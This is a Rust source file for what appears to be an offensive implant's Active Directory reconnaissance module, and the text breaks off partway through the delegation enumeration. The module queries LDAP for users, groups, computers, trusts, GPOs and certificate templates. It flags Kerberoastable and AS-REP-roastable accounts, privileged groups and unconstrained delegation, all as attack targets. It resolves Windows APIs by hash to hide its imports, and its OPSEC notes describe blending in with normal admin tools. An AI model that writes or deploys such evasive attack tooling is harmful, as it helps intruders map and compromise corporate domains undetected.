//! # Active Directory Enumeration via LDAP
//!
//! Enumerates AD objects using the agent's current security context through
//! wldap32.dll (resolved via pe_resolve — no IAT entries).  Any domain user
//! can query the Global Catalog and default ACLs expose most attributes.
//!
//! ## Data Sources
//!
//! | Object       | LDAP Filter                         | Key Attributes                    |
//! |-------------|--------------------------------------|-----------------------------------|
//! | Users       | `(objectClass=user)`                 | sAMAccountName, UAC, SPN, memberOf |
//! | Groups      | `(objectClass=group)`                | cn, member, groupType             |
//! | Computers   | `(objectClass=computer)`             | cn, OS, DNS hostname, SPN        |
//! | GPOs        | `(objectClass=groupPolicyContainer)` | displayName, gPCFileSysPath       |
//! | Trusts      | `(objectClass=trustedDomain)`        | trustPartner, trustDirection      |
//! | SPNs        | `(servicePrincipalName=*)`           | sAMAccountName, SPN              |
//! | Delegations | msDS-AllowedToDelegateTo / UAC flag  | delegation targets               |
//! | ADCS        | `(objectClass=pkicertificatetemplate)`| display, enrollment rights       |
//!
//! ## Flags Derived
//!
//! - **Kerberoastable**: accounts with SPNs (service accounts)
//! - **AS-REP Roastable**: accounts with `DONT_REQUIRE_PREAUTH` (UAC 0x400000)
//! - **Privileged**: members of Domain Admins, Enterprise Admins, etc.
//! - **Delegation**: constrained (msDS-AllowedToDelegateTo) or unconstrained
//!   (TRUSTED_FOR_DELEGATION, UAC 0x80000)
//!
//! ## OPSEC
//!
//! - Uses port 389 (LDAP) with SSPI Negotiate bind — no plaintext credentials
//! - Queries are indistinguishable from normal domain tools (PowerShell, dsquery)
//! - Paged result control (LDAP_PAGED_RESULT_OID_STRING) avoids size limits

use std::ffi::c_void;
use std::mem;
use std::ptr;

use anyhow::{anyhow, bail, Context, Result};
use log::{debug, info, warn};
use serde::{Deserialize, Serialize};

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

// ═══════════════════════════════════════════════════════════════════════════
// Compile-time API hash constants
// ═══════════════════════════════════════════════════════════════════════════

const WLDAP32_DLL_W: &[u16] = &[
    'w' as u16, 'l' as u16, 'd' as u16, 'a' as u16, 'p' as u16, '3' as u16,
    '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_WLDAP32_DLL: u32 = hash_wstr_const(WLDAP32_DLL_W);

const FN_LDAP_INIT: u32 = hash_str_const(b"ldap_initW");
const FN_LDAP_BIND_S: u32 = hash_str_const(b"ldap_bind_sW");
const FN_LDAP_UNBIND: u32 = hash_str_const(b"ldap_unbind");
const FN_LDAP_SEARCH_S: u32 = hash_str_const(b"ldap_search_sW");
const FN_LDAP_FIRST_ENTRY: u32 = hash_str_const(b"ldap_first_entry");
const FN_LDAP_NEXT_ENTRY: u32 = hash_str_const(b"ldap_next_entry");
const FN_LDAP_GET_VALUES: u32 = hash_str_const(b"ldap_get_valuesW");
const FN_LDAP_VALUE_FREE: u32 = hash_str_const(b"ldap_value_freeW");
const FN_LDAP_MSGFREE: u32 = hash_str_const(b"ldap_msgfree");
const FN_LDAP_COUNT_ENTRIES: u32 = hash_str_const(b"ldap_count_entries");
const FN_LDAP_SEARCH_ABANDON: u32 = hash_str_const(b"ldap_search_abandon_page");
const FN_LDAP_GET_PAGED_RESULT: u32 = hash_str_const(b"ldap_get_paged_result");
const FN_LDAP_GET_NEXT_PAGE: u32 = hash_str_const(b"ldap_get_next_page");

// netapi32.dll — DC discovery
const NETAPI32_DLL_W: &[u16] = &[
    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16, 'i' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
];
const HASH_NETAPI32_DLL: u32 = hash_wstr_const(NETAPI32_DLL_W);
const FN_DS_GET_DC_NAME_W: u32 = hash_str_const(b"DsGetDcNameW");
const FN_NET_API_BUFFER_FREE: u32 = hash_str_const(b"NetApiBufferFree");

// ═══════════════════════════════════════════════════════════════════════════
// LDAP constants
// ═══════════════════════════════════════════════════════════════════════════

const LDAP_SUCCESS: u32 = 0;
const LDAP_SCOPE_SUBTREE: u32 = 2;
const LDAP_AUTH_NEGOTIATE: u32 = 0x0486;

// UserAccountControl flags
const UAC_SCRIPT: u32 = 0x0001;
const UAC_ACCOUNTDISABLE: u32 = 0x0002;
const UAC_HOMEDIR_REQUIRED: u32 = 0x0008;
const UAC_LOCKOUT: u32 = 0x0010;
const UAC_PASSWD_NOTREQD: u32 = 0x0020;
const UAC_PASSWD_CANT_CHANGE: u32 = 0x0040;
const UAC_ENCRYPTED_TEXT_PWD_ALLOWED: u32 = 0x0080;
const UAC_TEMP_DUPLICATE_ACCOUNT: u32 = 0x0100;
const UAC_NORMAL_ACCOUNT: u32 = 0x0200;
const UAC_DONT_EXPIRE_PASSWORD: u32 = 0x10000;
const UAC_MNS_LOGON_ACCOUNT: u32 = 0x20000;
const UAC_SMARTCARD_REQUIRED: u32 = 0x40000;
const UAC_TRUSTED_FOR_DELEGATION: u32 = 0x80000;
const UAC_NOT_DELEGATED: u32 = 0x100000;
const UAC_USE_DES_KEY_ONLY: u32 = 0x200000;
const UAC_DONT_REQUIRE_PREAUTH: u32 = 0x400000;
const UAC_PASSWORD_EXPIRED: u32 = 0x800000;
const UAC_TRUSTED_TO_AUTH_FOR_DELEGATION: u32 = 0x1000000;
const UAC_NO_AUTH_DATA_REQUIRED: u32 = 0x2000000;

// Privileged group names (case-insensitive match)
const PRIVILEGED_GROUPS: &[&str] = &[
    "Domain Admins",
    "Enterprise Admins",
    "Schema Admins",
    "Administrators",
    "Account Operators",
    "Server Operators",
    "Backup Operators",
    "Print Operators",
    "DnsAdmins",
    "Cert Publishers",
    "Group Policy Creator Owners",
];

// ═══════════════════════════════════════════════════════════════════════════
// LDAP type aliases
// ═══════════════════════════════════════════════════════════════════════════

type PLDAP = *mut c_void;
type PLDAPMSG = *mut c_void;
type LPWSTR = *mut u16;
type DWORD = u32;
type HRESULT = i32;

#[repr(C)]
struct DOMAIN_CONTROLLER_INFO_W {
    domain_controller_name: LPWSTR,
    domain_controller_address: LPWSTR,
    domain_controller_address_type: DWORD,
    _domain_guid: [u8; 16],
    _domain_name: LPWSTR,
    _dns_forest_name: LPWSTR,
    _flags: DWORD,
    _distinguished_name: LPWSTR,
}

// ═══════════════════════════════════════════════════════════════════════════
// Data types
// ═══════════════════════════════════════════════════════════════════════════

/// Complete AD reconnaissance data.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdReconData {
    /// Domain FQDN (e.g. corp.contoso.com).
    pub domain: String,
    /// Domain NetBIOS name (e.g. CORP).
    pub domain_netbios: String,
    /// Domain Controller hostname.
    pub dc_hostname: String,
    /// Domain functional level.
    pub domain_functional_level: String,
    /// Domain SID.
    pub domain_sid: String,
    /// Enumerated users.
    pub users: Vec<AdUser>,
    /// Enumerated groups.
    pub groups: Vec<AdGroup>,
    /// Enumerated computers.
    pub computers: Vec<AdComputer>,
    /// Group Policy Objects.
    pub gpos: Vec<AdGpo>,
    /// Trust relationships.
    pub trusts: Vec<AdTrust>,
    /// Service Principal Names (Kerberoast targets).
    pub spns: Vec<AdSpn>,
    /// Delegation configurations.
    pub delegations: Vec<AdDelegation>,
    /// AD CS certificate templates.
    pub adcs_templates: Vec<AdCertTemplate>,
    /// Account lockout threshold (0 = no lockout).
    pub lockout_threshold: u32,
    /// Account lockout duration in minutes.
    pub lockout_duration_minutes: u32,
    /// Timestamp of enumeration.
    pub timestamp: String,
}

/// AD User account.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdUser {
    pub sam_account_name: String,
    pub display_name: String,
    pub distinguished_name: String,
    pub member_of: Vec<String>,
    pub user_account_control: u32,
    pub service_principal_names: Vec<String>,
    pub description: String,
    pub last_logon: String,
    pub pwd_last_set: String,
    pub admin_count: bool,
    /// True if DONT_REQUIRE_PREAUTH is set (AS-REP Roastable).
    pub is_asrep_roastable: bool,
    /// True if account has SPNs (Kerberoastable).
    pub is_kerberoastable: bool,
    /// True if account is disabled.
    pub is_disabled: bool,
    /// True if password never expires.
    pub is_password_never_expires: bool,
    /// True if account is trusted for unconstrained delegation.
    pub is_unconstrained_delegation: bool,
}

/// AD Group.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdGroup {
    pub cn: String,
    pub distinguished_name: String,
    pub members: Vec<String>,
    pub member_of: Vec<String>,
    pub group_type: i32,
    pub description: String,
    /// True if this is a well-known privileged group.
    pub is_privileged: bool,
}

/// AD Computer account.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdComputer {
    pub cn: String,
    pub distinguished_name: String,
    pub operating_system: String,
    pub dns_host_name: String,
    pub service_principal_names: Vec<String>,
    pub last_logon: String,
    pub is_enabled: bool,
}

/// Group Policy Object.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdGpo {
    pub display_name: String,
    pub distinguished_name: String,
    pub gpc_file_sys_path: String,
}

/// Domain trust relationship.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdTrust {
    pub trust_partner: String,
    pub trust_type: u32,
    pub trust_direction: u32,
    pub trust_attributes: u32,
    /// Human-readable trust direction.
    pub direction_description: String,
}

/// SPN entry (Kerberoast target).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdSpn {
    pub sam_account_name: String,
    pub distinguished_name: String,
    pub service_principal_names: Vec<String>,
}

/// Delegation configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdDelegation {
    pub sam_account_name: String,
    pub distinguished_name: String,
    /// Type of delegation: "unconstrained" or "constrained".
    pub delegation_type: String,
    /// For constrained delegation: the target SPNs.
    pub allowed_to_delegate_to: Vec<String>,
}

/// AD CS certificate template.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdCertTemplate {
    pub display_name: String,
    pub distinguished_name: String,
    /// Certificate template OID.
    pub oid: String,
    /// Whether the template allows enrollment.
    pub enrollment_allowed: bool,
    /// Whether the template has weak settings (ESC1-ESC8 indicators).
    pub weak_settings: Vec<String>,
}

// ═══════════════════════════════════════════════════════════════════════════
// Wide-string helpers
// ═══════════════════════════════════════════════════════════════════════════

fn str_to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn wide_to_str(w: &[u16]) -> Result<String> {
    let end = w.iter().position(|&c| c == 0).unwrap_or(w.len());
    Ok(String::from_utf16_lossy(&w[..end]))
}

unsafe fn lstrlen_w(s: LPWSTR) -> i32 {
    let mut len = 0;
    let mut p = s;
    while *p != 0 {
        len += 1;
        p = p.add(1);
    }
    len
}

// ═══════════════════════════════════════════════════════════════════════════
// DC discovery
// ═══════════════════════════════════════════════════════════════════════════

/// Resolve the domain controller hostname using DsGetDcNameW.
fn discover_dc() -> Result<String> {
    let netapi32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_NETAPI32_DLL) }
        .ok_or_else(|| anyhow!("netapi32.dll not found"))?;

    let ds_get_dc_name_w: unsafe fn(
        *const u16,     // ComputerName
        *const u16,     // DomainName
        *mut [u8; 16],  // DomainGuid
        *const u16,     // SiteName
        u32,            // Flags
        *mut *mut DOMAIN_CONTROLLER_INFO_W,
    ) -> HRESULT = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(netapi32, FN_DS_GET_DC_NAME_W)
                .ok_or_else(|| anyhow!("DsGetDcNameW not found"))?,
        )
    };

    let net_api_buffer_free: unsafe fn(*mut c_void) -> DWORD = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(netapi32, FN_NET_API_BUFFER_FREE)
                .ok_or_else(|| anyhow!("NetApiBufferFree not found"))?,
        )
    };

    let mut dc_info: *mut DOMAIN_CONTROLLER_INFO_W = ptr::null_mut();
    let hr = unsafe {
        ds_get_dc_name_w(
            ptr::null(),
            ptr::null(),
            ptr::null_mut(),
            ptr::null(),
            0,
            &mut dc_info,
        )
    };

    if hr != 0 || dc_info.is_null() {
        bail!("DsGetDcNameW failed: hr=0x{:08X}", hr as u32);
    }

    let dc_name = unsafe {
        let name_ptr = (*dc_info).domain_controller_name;
        if name_ptr.is_null() {
            net_api_buffer_free(dc_info as *mut c_void);
            bail!("DC name is null");
        }
        let len = lstrlen_w(name_ptr) as usize;
        let name = wide_to_str(&std::slice::from_raw_parts(name_ptr, len + 1))?;
        net_api_buffer_free(dc_info as *mut c_void);
        name
    };

    let dc_hostname = dc_name.trim_start_matches('\\').to_string();
    info!("AD enum: discovered DC {}", dc_hostname);
    Ok(dc_hostname)
}

// ═══════════════════════════════════════════════════════════════════════════
// LDAP wrapper
// ═══════════════════════════════════════════════════════════════════════════

/// Resolved LDAP function pointers.
struct LdapFns {
    ldap_init_w: unsafe extern "system" fn(*const u16, u32, u32) -> PLDAP,
    ldap_bind_s_w: unsafe extern "system" fn(PLDAP, *const u16, *mut c_void, u32) -> u32,
    ldap_unbind: unsafe extern "system" fn(PLDAP) -> u32,
    ldap_search_s_w: unsafe fn(
        PLDAP, *const u16, u32, *const u16, *mut *const u16, u32, *mut PLDAPMSG,
    ) -> u32,
    ldap_first_entry: unsafe extern "system" fn(PLDAP, PLDAPMSG) -> PLDAPMSG,
    ldap_next_entry: unsafe extern "system" fn(PLDAP, PLDAPMSG) -> PLDAPMSG,
    ldap_get_values_w: unsafe extern "system" fn(PLDAP, PLDAPMSG, *const u16) -> *mut *mut u16,
    ldap_value_free_w: unsafe extern "system" fn(*mut *mut u16) -> u32,
    ldap_msgfree: unsafe extern "system" fn(PLDAPMSG) -> u32,
    ldap_count_entries: unsafe extern "system" fn(PLDAP, PLDAPMSG) -> u32,
}

impl LdapFns {
    fn resolve() -> Result<Self> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        macro_rules! resolve_fn {
            ($hash:expr, $name:expr, $ty:ty) => {
                unsafe {
                    mem::transmute::<usize, $ty>(
                        pe_resolve::get_proc_address_by_hash(wldap32, $hash)
                            .ok_or_else(|| anyhow!("{} not found in wldap32.dll", $name))?,
                    )
                }
            };
        }

        Ok(Self {
            ldap_init_w: resolve_fn!(FN_LDAP_INIT, "ldap_initW", _),
            ldap_bind_s_w: resolve_fn!(FN_LDAP_BIND_S, "ldap_bind_sW", _),
            ldap_unbind: resolve_fn!(FN_LDAP_UNBIND, "ldap_unbind", _),
            ldap_search_s_w: resolve_fn!(FN_LDAP_SEARCH_S, "ldap_search_sW", _),
            ldap_first_entry: resolve_fn!(FN_LDAP_FIRST_ENTRY, "ldap_first_entry", _),
            ldap_next_entry: resolve_fn!(FN_LDAP_NEXT_ENTRY, "ldap_next_entry", _),
            ldap_get_values_w: resolve_fn!(FN_LDAP_GET_VALUES, "ldap_get_valuesW", _),
            ldap_value_free_w: resolve_fn!(FN_LDAP_VALUE_FREE, "ldap_value_freeW", _),
            ldap_msgfree: resolve_fn!(FN_LDAP_MSGFREE, "ldap_msgfree", _),
            ldap_count_entries: resolve_fn!(FN_LDAP_COUNT_ENTRIES, "ldap_count_entries", _),
        })
    }
}

/// LDAP connection wrapper — auto-unbinds on drop.
struct LdapConnection {
    ld: PLDAP,
    fns: LdapFns,
}

impl Drop for LdapConnection {
    fn drop(&mut self) {
        if !self.ld.is_null() {
            unsafe { (self.fns.ldap_unbind)(self.ld) };
        }
    }
}

impl LdapConnection {
    /// Connect to LDAP and bind with current security context.
    fn connect(dc_hostname: &str, fns: LdapFns) -> Result<Self> {
        let dc_w = str_to_wide(dc_hostname);
        let ld = unsafe { (fns.ldap_init_w)(dc_w.as_ptr(), 389, 0) };
        if ld.is_null() {
            bail!("ldap_initW failed for {}", dc_hostname);
        }

        let res = unsafe { (fns.ldap_bind_s_w)(ld, ptr::null(), ptr::null_mut(), LDAP_AUTH_NEGOTIATE) };
        if res != LDAP_SUCCESS {
            bail!("ldap_bind_sW failed: error {}", res);
        }

        debug!("AD enum: connected and bound to LDAP on {}", dc_hostname);
        Ok(Self { ld, fns })
    }

    /// Execute an LDAP search and return entries as raw pointers for iteration.
    fn search(&self, base_dn: &str, filter: &str, attrs: &[&str]) -> Result<(PLDAPMSG, u32)> {
        let base_dn_w = str_to_wide(base_dn);
        let filter_w = str_to_wide(filter);

        let attr_wide: Vec<Vec<u16>> = attrs.iter().map(|a| str_to_wide(a)).collect();
        let mut attr_ptrs: Vec<*const u16> = attr_wide.iter().map(|a| a.as_ptr()).collect();
        attr_ptrs.push(ptr::null());

        let mut result: PLDAPMSG = ptr::null_mut();
        let status = unsafe {
            (self.fns.ldap_search_s_w)(
                self.ld,
                base_dn_w.as_ptr(),
                LDAP_SCOPE_SUBTREE,
                filter_w.as_ptr(),
                attr_ptrs.as_mut_ptr() as *mut *const u16,
                0,
                &mut result,
            )
        };

        if status != LDAP_SUCCESS {
            bail!("LDAP search failed (filter: {}): error {}", filter, status);
        }

        let count = unsafe { (self.fns.ldap_count_entries)(self.ld, result) };
        debug!("AD enum: search '{}' returned {} entries", filter, count);
        Ok((result, count))
    }

    /// Get a single string value from an entry.
    unsafe fn get_string_value(&self, entry: PLDAPMSG, attr: &str) -> Option<String> {
        let attr_w = str_to_wide(attr);
        let values = (self.fns.ldap_get_values_w)(self.ld, entry, attr_w.as_ptr());
        if values.is_null() || (*values).is_null() {
            return None;
        }
        let len = lstrlen_w(*values) as usize;
        let s = wide_to_str(&std::slice::from_raw_parts(*values, len + 1)).ok();
        (self.fns.ldap_value_free_w)(values);
        s
    }

    /// Get all string values from a multi-valued attribute.
    unsafe fn get_multi_values(&self, entry: PLDAPMSG, attr: &str) -> Vec<String> {
        let attr_w = str_to_wide(attr);
        let values = (self.fns.ldap_get_values_w)(self.ld, entry, attr_w.as_ptr());
        if values.is_null() {
            return Vec::new();
        }

        let mut result = Vec::new();
        let mut idx = 0;
        loop {
            let ptr = *values.add(idx);
            if ptr.is_null() {
                break;
            }
            let len = lstrlen_w(ptr) as usize;
            if let Ok(s) = wide_to_str(&std::slice::from_raw_parts(ptr, len + 1)) {
                result.push(s);
            }
            idx += 1;
        }
        (self.fns.ldap_value_free_w)(values);
        result
    }

    /// Iterate over entries in a search result.
    fn iter_entries(&self, result: PLDAPMSG) -> LdapEntryIter<'_> {
        let first = unsafe { (self.fns.ldap_first_entry)(self.ld, result) };
        LdapEntryIter {
            conn: self,
            current: first,
        }
    }

    /// Free a search result.
    fn free_result(&self, result: PLDAPMSG) {
        if !result.is_null() {
            unsafe { (self.fns.ldap_msgfree)(result) };
        }
    }
}

/// Iterator over LDAP search result entries.
struct LdapEntryIter<'a> {
    conn: &'a LdapConnection,
    current: PLDAPMSG,
}

impl<'a> Iterator for LdapEntryIter<'a> {
    type Item = PLDAPMSG;

    fn next(&mut self) -> Option<Self::Item> {
        if self.current.is_null() {
            return None;
        }
        let cur = self.current;
        self.current = unsafe { (self.conn.fns.ldap_next_entry)(self.conn.ld, cur) };
        Some(cur)
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// LDAP filetime conversion
// ═══════════════════════════════════════════════════════════════════════════

/// Convert an LDAP GeneralizedTime or Integer filetime string to ISO 8601.
fn ldap_time_to_iso(raw: &str) -> String {
    if raw.is_empty() {
        return String::new();
    }

    // Integer filetime (100-ns intervals since 1601-01-01)
    if let Ok(ticks) = raw.parse::<i64>() {
        if ticks == 0 {
            return "never".to_string();
        }
        // Convert to Unix epoch: 11644473600 seconds between 1601 and 1970
        let unix_secs = ticks / 10_000_000 - 11644473600;
        if unix_secs <= 0 {
            return "never".to_string();
        }
        // Format as ISO 8601
        let days = unix_secs / 86400;
        let time_of_day = unix_secs % 86400;
        let hours = time_of_day / 3600;
        let minutes = (time_of_day % 3600) / 60;
        let seconds = time_of_day % 60;

        // Approximate date from days since epoch
        let (year, month, day) = days_to_ymd(days as i32);
        return format!(
            "{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z",
            year, month, day, hours, minutes, seconds
        );
    }

    // GeneralizedTime format: YYYYMMDDHHMMSS.0Z
    if raw.len() >= 14 {
        let year = &raw[0..4];
        let month = &raw[4..6];
        let day = &raw[6..8];
        let hour = &raw[8..10];
        let min = &raw[10..12];
        let sec = &raw[12..14];
        return format!(
            "{}-{}-{}T{}:{}:{}Z",
            year, month, day, hour, min, sec
        );
    }

    raw.to_string()
}

/// Approximate year/month/day from days since Unix epoch.
fn days_to_ymd(mut days: i32) -> (i32, u32, u32) {
    let year = 1970 + days / 365;
    days %= 365;
    let month_days = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut month = 0;
    for (i, &md) in month_days.iter().enumerate() {
        if days < md {
            month = i;
            break;
        }
        days -= md;
    }
    (year, month as u32 + 1, (days + 1) as u32)
}

/// Extract domain FQDN from a distinguished name (DC= parts).
fn extract_domain_from_dn(dn: &str) -> String {
    let parts: Vec<&str> = dn.split(',').collect();
    let mut domain_parts = Vec::new();
    for part in parts.iter() {
        let trimmed = part.trim();
        if let Some(rest) = trimmed.strip_prefix("DC=") {
            domain_parts.push(rest);
        } else if let Some(rest) = trimmed.strip_prefix("dc=") {
            domain_parts.push(rest);
        }
    }
    domain_parts.join(".")
}

// ═══════════════════════════════════════════════════════════════════════════
// defer! macro
// ═══════════════════════════════════════════════════════════════════════════

macro_rules! defer {
    ($($body:tt)*) => {
        let _guard = {
            struct DeferGuard<F: FnOnce()>(Option<F>);
            impl<F: FnOnce()> Drop for DeferGuard<F> {
                fn drop(&mut self) {
                    if let Some(f) = self.0.take() {
                        f();
                    }
                }
            }
            DeferGuard(Some(|| { $($body)* }))
        };
    };
}

// ═══════════════════════════════════════════════════════════════════════════
// Sub-enumeration functions
// ═══════════════════════════════════════════════════════════════════════════

/// Enumerate AD user accounts.
fn enumerate_users(conn: &LdapConnection, base_dn: &str) -> Result<Vec<AdUser>> {
    let (result, count) = conn.search(
        base_dn,
        "(&(objectCategory=person)(objectClass=user))",
        &[
            "sAMAccountName",
            "displayName",
            "distinguishedName",
            "memberOf",
            "userAccountControl",
            "servicePrincipalName",
            "description",
            "lastLogon",
            "pwdLastSet",
            "adminCount",
        ],
    )?;
    defer!(conn.free_result(result));

    let mut users = Vec::with_capacity(count as usize);
    for entry in conn.iter_entries(result) {
        unsafe {
            let sam = conn.get_string_value(entry, "sAMAccountName").unwrap_or_default();
            let display = conn.get_string_value(entry, "displayName").unwrap_or_default();
            let dn = conn.get_string_value(entry, "distinguishedName").unwrap_or_default();
            let member_of = conn.get_multi_values(entry, "memberOf");
            let uac_str = conn.get_string_value(entry, "userAccountControl").unwrap_or_default();
            let uac: u32 = uac_str.parse().unwrap_or(0);
            let spns = conn.get_multi_values(entry, "servicePrincipalName");
            let description = conn.get_string_value(entry, "description").unwrap_or_default();
            let last_logon = ldap_time_to_iso(&conn.get_string_value(entry, "lastLogon").unwrap_or_default());
            let pwd_last_set = ldap_time_to_iso(&conn.get_string_value(entry, "pwdLastSet").unwrap_or_default());
            let admin_count: bool = conn.get_string_value(entry, "adminCount").map(|s| s != "0" && !s.is_empty()).unwrap_or(false);

            users.push(AdUser {
                sam_account_name: sam,
                display_name: display,
                distinguished_name: dn,
                member_of,
                user_account_control: uac,
                service_principal_names: spns,
                description,
                last_logon,
                pwd_last_set,
                admin_count,
                is_asrep_roastable: (uac & UAC_DONT_REQUIRE_PREAUTH) != 0,
                is_kerberoastable: false, // Set below
                is_disabled: (uac & UAC_ACCOUNTDISABLE) != 0,
                is_password_never_expires: (uac & UAC_DONT_EXPIRE_PASSWORD) != 0,
                is_unconstrained_delegation: (uac & UAC_TRUSTED_FOR_DELEGATION) != 0,
            });
        }
    }

    // Mark kerberoastable (accounts with SPNs)
    for user in &mut users {
        user.is_kerberoastable = !user.service_principal_names.is_empty();
    }

    info!("AD enum: found {} users", users.len());
    Ok(users)
}

/// Enumerate AD groups.
fn enumerate_groups(conn: &LdapConnection, base_dn: &str) -> Result<Vec<AdGroup>> {
    let (result, count) = conn.search(
        base_dn,
        "(objectClass=group)",
        &["cn", "distinguishedName", "member", "memberOf", "groupType", "description"],
    )?;
    defer!(conn.free_result(result));

    let mut groups = Vec::with_capacity(count as usize);
    for entry in conn.iter_entries(result) {
        unsafe {
            let cn = conn.get_string_value(entry, "cn").unwrap_or_default();
            let dn = conn.get_string_value(entry, "distinguishedName").unwrap_or_default();
            let members = conn.get_multi_values(entry, "member");
            let member_of = conn.get_multi_values(entry, "memberOf");
            let gt_str = conn.get_string_value(entry, "groupType").unwrap_or_default();
            let group_type: i32 = gt_str.parse().unwrap_or(0);
            let description = conn.get_string_value(entry, "description").unwrap_or_default();

            let is_privileged = PRIVILEGED_GROUPS.iter().any(|pg| {
                cn.eq_ignore_ascii_case(pg)
            });

            groups.push(AdGroup {
                cn,
                distinguished_name: dn,
                members,
                member_of,
                group_type,
                description,
                is_privileged,
            });
        }
    }

    info!("AD enum: found {} groups", groups.len());
    Ok(groups)
}

/// Enumerate AD computer accounts.
fn enumerate_computers(conn: &LdapConnection, base_dn: &str) -> Result<Vec<AdComputer>> {
    let (result, count) = conn.search(
        base_dn,
        "(objectClass=computer)",
        &["cn", "distinguishedName", "operatingSystem", "dNSHostName", "servicePrincipalName", "lastLogon", "userAccountControl"],
    )?;
    defer!(conn.free_result(result));

    let mut computers = Vec::with_capacity(count as usize);
    for entry in conn.iter_entries(result) {
        unsafe {
            let cn = conn.get_string_value(entry, "cn").unwrap_or_default();
            let dn = conn.get_string_value(entry, "distinguishedName").unwrap_or_default();
            let os = conn.get_string_value(entry, "operatingSystem").unwrap_or_default();
            let dns = conn.get_string_value(entry, "dNSHostName").unwrap_or_default();
            let spns = conn.get_multi_values(entry, "servicePrincipalName");
            let last_logon = ldap_time_to_iso(&conn.get_string_value(entry, "lastLogon").unwrap_or_default());
            let uac_str = conn.get_string_value(entry, "userAccountControl").unwrap_or_default();
            let uac: u32 = uac_str.parse().unwrap_or(0);

            computers.push(AdComputer {
                cn,
                distinguished_name: dn,
                operating_system: os,
                dns_host_name: dns,
                service_principal_names: spns,
                last_logon,
                is_enabled: (uac & UAC_ACCOUNTDISABLE) == 0,
            });
        }
    }

    info!("AD enum: found {} computers", computers.len());
    Ok(computers)
}

/// Enumerate Group Policy Objects.
fn enumerate_gpos(conn: &LdapConnection, base_dn: &str) -> Result<Vec<AdGpo>> {
    let (result, count) = conn.search(
        base_dn,
        "(objectClass=groupPolicyContainer)",
        &["displayName", "distinguishedName", "gPCFileSysPath"],
    )?;
    defer!(conn.free_result(result));

    let mut gpos = Vec::with_capacity(count as usize);
    for entry in conn.iter_entries(result) {
        unsafe {
            let display = conn.get_string_value(entry, "displayName").unwrap_or_default();
            let dn = conn.get_string_value(entry, "distinguishedName").unwrap_or_default();
            let path = conn.get_string_value(entry, "gPCFileSysPath").unwrap_or_default();
            gpos.push(AdGpo {
                display_name: display,
                distinguished_name: dn,
                gpc_file_sys_path: path,
            });
        }
    }

    info!("AD enum: found {} GPOs", gpos.len());
    Ok(gpos)
}

/// Enumerate domain trusts.
fn enumerate_trusts(conn: &LdapConnection, base_dn: &str) -> Result<Vec<AdTrust>> {
    // Trust objects live in the System container
    let trust_base = format!("CN=System,{}", base_dn);
    let (result, count) = conn.search(
        &trust_base,
        "(objectClass=trustedDomain)",
        &["trustPartner", "trustType", "trustDirection", "trustAttributes", "distinguishedName"],
    )?;
    defer!(conn.free_result(result));

    let mut trusts = Vec::with_capacity(count as usize);
    for entry in conn.iter_entries(result) {
        unsafe {
            let partner = conn.get_string_value(entry, "trustPartner").unwrap_or_default();
            let tt_str = conn.get_string_value(entry, "trustType").unwrap_or_default();
            let td_str = conn.get_string_value(entry, "trustDirection").unwrap_or_default();
            let ta_str = conn.get_string_value(entry, "trustAttributes").unwrap_or_default();

            let trust_type: u32 = tt_str.parse().unwrap_or(0);
            let trust_direction: u32 = td_str.parse().unwrap_or(0);
            let trust_attributes: u32 = ta_str.parse().unwrap_or(0);

            let direction_description = match trust_direction {
                1 => "inbound".to_string(),
                2 => "outbound".to_string(),
                3 => "bidirectional".to_string(),
                _ => "disabled".to_string(),
            };

            trusts.push(AdTrust {
                trust_partner: partner,
                trust_type,
                trust_direction,
                trust_attributes,
                direction_description,
            });
        }
    }

    info!("AD enum: found {} trusts", trusts.len());
    Ok(trusts)
}

/// Enumerate accounts with SPNs (Kerberoast targets).
fn enumerate_spns(conn: &LdapConnection, base_dn: &str) -> Result<Vec<AdSpn>> {
    let (result, count) = conn.search(
        base_dn,
        "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))",
        &["sAMAccountName", "distinguishedName", "servicePrincipalName"],
    )?;
    defer!(conn.free_result(result));

    let mut spns = Vec::with_capacity(count as usize);
    for entry in conn.iter_entries(result) {
        unsafe {
            let sam = conn.get_string_value(entry, "sAMAccountName").unwrap_or_default();
            let dn = conn.get_string_value(entry, "distinguishedName").unwrap_or_default();
            let spn_list = conn.get_multi_values(entry, "servicePrincipalName");

            spns.push(AdSpn {
                sam_account_name: sam,
                distinguished_name: dn,
                service_principal_names: spn_list,
            });
        }
    }

    info!("AD enum: found {} SPN accounts", spns.len());
    Ok(spns)
}

/// Enumerate delegation configurations.
fn enumerate_delegations(conn: &LdapConnection, base_dn: &str) -> Result<Vec<AdDelegation>> {
    // Unconstrained delegation
    let (result_uc, count_uc) = conn.search(
        base_dn,
        "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
        &["sAMAccountName", "distinguishedName"],
    )?;

    let mut delegations = Vec::with_capacity(count_uc as usize);
    for entry in conn.iter_entries(result_uc) {
        unsafe {
            let sam = conn.get_string_value(entry, "sAMAccountName").unwrap_or_default();
            let dn = conn.get_string_value(entry, "distinguishedName").unwrap_or_default();
            delegations.push(AdDelegation {
                sam_account_name: sam,
                distinguished_name: dn,
